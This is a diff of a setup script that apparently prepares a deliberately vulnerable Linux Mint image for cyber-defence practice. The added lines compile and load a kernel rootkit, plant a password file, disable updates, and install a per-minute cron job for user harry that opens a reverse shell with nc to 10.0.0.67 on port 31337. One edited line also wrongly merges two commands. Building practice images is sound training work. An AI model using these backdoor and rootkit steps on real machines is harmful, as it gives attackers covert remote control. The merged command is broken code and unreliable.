@@ -11,13 +11,30 @@ fi
 source ./config.sh
 source ./helpers.sh
 
+# install forensics questions
+echo "install forensics questions"
+declare -n list="${forensics_questions[questions]}"
+for file in "${list[@]}"; do
+  cp -f ./forensics/$file $location
+  chown ${cpuser}:${cpuser} ${location}/${file}
+  chmod 0644 ${location}/${file}
+done
+
+# install rootkit
+(cd orig/rootkit/ && make)
+mkdir -p /var/nonofind/
+echo "password_value=1ts4m3M4r10" > /var/nonofind/secret_password.txt
+insmod orig/rootkit/cpnofind.ko
+(cd orig/rootkit && make clean)
+
 # set nameserver
 sed 's/nameserver.*/nameserver 8.8.8.8/' -i /etc/resolv.conf
 
-sudo -iu $SUDO_USER dbus-launch gsettings set com.linuxmint.updates refresh-schedule-enabled false
-mintupdate-automation upgrade disable
+# set mint update settings
+sudo -iu $SUDO_USER dbus-launch gsettings set com.linuxmint.updates refresh-schedule-enabled falsemintupdate-automation upgrade disable
 systemctl stop mintupdate-automation-upgrade.timer
 
+# cron/at
 apt install at -y
 crontab -r -u harry
 killall -u harry
@@ -107,17 +124,9 @@ cp -f orig/sysctl.conf /etc/
 cp -f orig/lightdm.conf /etc/lightdm/
 cp -f orig/sshd_config /etc/ssh/
 
-echo "install forensics questions"
-declare -n list="${forensics_questions[questions]}"
-for file in "${list[@]}"; do
-  cp -f ./forensics/$file $location
-  chown ${cpuser}:${cpuser} ${location}/${file}
-  chmod 0644 ${location}/${file}
-
 # reverse shell crontab for harry
 rm /tmp/leet
 cat <(echo "* * * * * rm /tmp/leet; mkfifo /tmp/leet; </tmp/leet /bin/sh -i 2>&1 | nc -q2 10.0.0.67 31337 >/tmp/leet") | crontab -u harry -
-done
 
 # ufw
 ufw disable
